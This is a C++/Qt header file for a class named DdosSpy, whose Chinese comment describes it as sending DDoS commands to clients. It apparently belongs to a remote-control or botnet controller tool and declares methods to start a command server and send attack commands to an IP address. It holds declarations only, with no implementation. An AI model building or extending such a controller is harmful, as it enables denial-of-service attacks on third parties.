/*
 *  Author: 752049643@qq.com
 *  Date: 2017-12-24
 *  Brief: 发送DDOS命令给客户端
 *
 */

#ifndef DDOSSPY_H
#define DDOSSPY_H

#include <QWidget>
#include <QApplication>
#include <QDesktopWidget>
#include "tcpsocket.h"
#include "tcpserver.h"

class DdosSpy : public QWidget
{
    Q_OBJECT
public:
    explicit DdosSpy(QWidget *parent = 0);

    // 结束符号
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // 开始Cmd控制服务器，然后返回新的端口号
    int startDdosSpyServer(QString userName);
    // 发送指令
    void sendCommand(QString IP);

private:
    TcpServer *mServer;     // 服务端
    TcpSocket *mSock;       // 客户socket



};
#endif // DDOSSPY_H
